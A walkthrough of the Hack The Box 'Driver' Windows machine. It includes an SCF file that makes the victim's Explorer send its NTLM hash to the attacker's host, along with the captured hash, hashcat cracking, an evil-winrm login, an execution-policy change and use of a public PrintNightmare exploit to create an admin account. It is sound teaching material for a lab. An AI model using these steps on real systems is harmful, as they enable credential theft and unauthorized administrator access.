# Driver Machine(10.10.11.106)

This was an easy windows machine

![Screenshot from 2022-02-26 11-05-57](https://user-images.githubusercontent.com/79413473/155835002-a6605375-25bc-42ab-b0df-e729982bf64a.png)

## Recon
on port scan we 4 open ports
```
22/tcp   filtered ssh
80/tcp   open     http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open     msrpc        Microsoft Windows RPC
445/tcp  open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:window
``` 
As scan says port 80 is running windows IIS server. Port 135 is MSRPC and port 445 is running smb. Port 5985 is [winrm](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) consider it as ssh of windows to login into remote computer and run commands on it. We will use [evil-winrm](https://github.com/Hackplayers/evil-winrm) tool, a pentest tool which support features like file upload/download, powershell and bash syntax also, which also utilises winrm to login.

Directory and file fuzzing doesn't reveal much other than *images* and *index.php* which also gives 401 or 403 error. As it's using *HTTP Basic Authentication* which force user to authenticate themselve before making http request. 

![Screenshot from 2022-02-26 13-34-34](https://user-images.githubusercontent.com/79413473/155835548-82007a0b-d007-4216-b83c-4edb8b680423.png)

On Correct login it's set's a Authorization header for future request which have base64 encoded username & pasword.

![Screenshot from 2022-02-26 12-08-42](https://user-images.githubusercontent.com/79413473/155835534-28ae284e-3406-4667-9647-cb3a2b0f7cf7.png)

As we don't have any creds. let's move on to smb.

## Foothold: Capturing NTLM hash by scf file upload 
Smb anonymous login is not enabled so we can't list shares `smbclient -L //10.10.11.106/`

![Screenshot from 2022-02-26 13-07-24](https://user-images.githubusercontent.com/79413473/155835590-6b441d73-02b6-42ef-a03d-8fef5bcfbfd1.png)

Let's enumerate smb version using metasploit's **auxiliary/scanner/smb/smb_version/** module

![Screenshot from 2022-02-26 13-03-12](https://user-images.githubusercontent.com/79413473/155835605-a936e311-c589-4853-adb4-f30c661bcf37.png)

It tells it using windows build 10240 and possibly smb version 3.1.1. Let's google that **smb 3.1.1 exploit** and we find **cve_2020_0796** buffer overflow vulnerability all over the search. But every exploit said not vulnerable. At this point i was in rabbit hole. The thing was i didn't try to login with default credentials like admin:admin or admin:password. 

So, we can authenticate with **admin:admin**. 

![Screenshot from 2022-02-26 14-04-17](https://user-images.githubusercontent.com/79413473/155836407-b8822309-29b1-4744-be5c-0dd258a51cd0.png)

Let's also add **driver.htb** to our hosts file. Also we got some firmware upload option here looks like this could be our way in.

![Screenshot from 2022-02-26 14-09-23](https://user-images.githubusercontent.com/79413473/155836527-7adc8d67-225e-4e23-b7a5-d92922147239.png)

After uploading any random file here we get this message 

![Screenshot from 2022-02-26 14-25-04](https://user-images.githubusercontent.com/79413473/155836999-b3dc035b-27a6-4f62-9ddc-aa83ed8d4230.png)

This file share could be hint towards smb, which is nothing but a fileshare. And manually lookin into these files that could be somthing. SO quick google search **file upload exploit smb** brings [this](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) blogpost about scf file upload attack. SCF files forces file explorer to execute it and when explorer try to open the share listed in it, it will authenticate against our server and we steal user's NTLM hash. Also quick search on ippsec.rocks brings [this](https://www.youtube.com/watch?v=YVhlfUvsqYc&t=1150s) video about same attack. So it was pretty easy to understand from here and  let's do it.

Creating our test scf file
```
[Shell]
Command=2
IconFile=\\10.10.16.5\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
Let's capture hash with metasploit module **auxiliary/server/capture/smb**. Run  msfconsole with sudo permission as listening on port 445 requires root privilege. Then submit test.scf file and instatly we got tony user's hash

![Screenshot from 2022-02-26 14-34-55](https://user-images.githubusercontent.com/79413473/155837283-2c8c1dba-3069-4dc0-a09e-f641af133c2e.png)

### hash:
```
tony::DRIVER:5e438a66f72aeb2a:ea87bc8d6aa9f67fc40c654c42befff4:010100000000000080df2adbef2ad801411c81cce0c256bd000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f00750073000700080080df2adbef2ad8010600040002000000080030003000000000000000000000000020000048d56dd3702ce694d4b7551a1faf2507f676bb328b0bdd210752be59f65ed9220a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003500000000000000000000000000
```

Let's crack this hash with hashcat in google colab server, we basically install hashcat and rockyou on colab and then crack it there you could do it on your own machine also. Colab [notebook](https://colab.research.google.com/github/mxrch/penglab/blob/master/penglab.ipynb). 
```
!hashcat/hashcat hash wordlists/rockyou.txt ```
```
It crack it **tony:liltony**

Let's try to login with it to smb, and it works.

![Screenshot from 2022-02-26 15-00-14](https://user-images.githubusercontent.com/79413473/155837955-d3584993-1dc8-4e16-8c41-c44b04650ea0.png)

Let'c check if wee can login into system with it using evil-winrm. `evil-winrm -i 10.10.11.106 -u tony -p liltony`

![Screenshot from 2022-02-26 15-02-10](https://user-images.githubusercontent.com/79413473/155838001-309a855a-6e8a-494f-8706-6eed8e30275b.png)

We got user on machine.

## Privilege escaltion: CVE-2021-1675 - PrintNightmare

After getting user started enumerating box with tips and trciks listed on internet inn order to search something vulernable. Although it was in front of me but couldn't spot it. Then people from discord came to help, running winpeas we get that spoolsv service is running which is associated with printer spooler service. and it's vulnerable to printnightmare attack. In which printer gives grant full admin level privilege to any user.

![Screenshot from 2022-02-26 16-02-30](https://user-images.githubusercontent.com/79413473/155840754-ddaed85f-3f07-42e9-8785-360d8ed8eb4c.png)


We will use this exploit developed by johnhammond sir. 

Exploit link: [here](https://github.com/calebstewart/CVE-2021-1675)

Clone the repo and then
1. Upload the powershell script to victim machine using evil-winrm `upload CVE-2021-1675.ps1` .
2. Let's import this module/script to our session **Import-Module .\cve-2021-1675.ps1**. But it fails with following *Execution-Policy* error

![Screenshot from 2022-02-26 15-14-22](https://user-images.githubusercontent.com/79413473/155838502-7605a539-9b61-44e3-9cac-44f93f79cab2.png)

now this is a security feature of powershell which doesn't allow any external malicious script to get loaded into current session. We would need to curcumvent that. Error also gives a [URL](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) link let's study that. 

as per this  we can change the execution policy

*"On a Windows computer you can set an execution policy for the local computer, for the current user, or for a particular session. You can also use a Group Policy setting to set execution policies for computers and users."*

There are different types of execution policy like strcited, unrestrcited, default, bypass etc. to specify what to do when somone tries to load script. Let's check our permissions.

 **Get-ExecutionPolicy** : and we are restrcited, let's change that.

![Screenshot from 2022-02-26 15-24-29](https://user-images.githubusercontent.com/79413473/155838706-09e04727-cbec-454a-9390-394e930c948e.png)

**Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser** : It will set scope to unrestrcited for currentuser

![Screenshot from 2022-02-26 15-26-45](https://user-images.githubusercontent.com/79413473/155838765-c8c832ad-9114-4a5d-8931-2624837ed0c8.png)

Let's invoke the script now 

![Screenshot from 2022-02-26 15-28-35](https://user-images.githubusercontent.com/79413473/155838906-53f69923-d3b9-464e-a77c-b14977493529.png)

Now we can login with new creds. **adm1n:P@ssw0rd**. as it have added this user to **Administrator** group.

![Screenshot from 2022-02-26 15-30-27](https://user-images.githubusercontent.com/79413473/155838924-0c4da7f9-cf2b-49f6-9e1d-bd9dd3025284.png)

And we are admin on box, yeet!

## Cleanup:
+ Remove the powershell script from machine.
+ Set execution policy back to restrcited `Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser`
+ Delete the **adm1n** user from machine. `net user adm1n /delete`

![Screenshot from 2022-02-26 16-21-22](https://user-images.githubusercontent.com/79413473/155840468-942a5028-0ef0-4e0b-b9d7-457379783703.png)


Thank you for reading and feedbacks are welcome. Hoping to improve my windows hacking skills over coming months.

Twitter: Avinashkroy
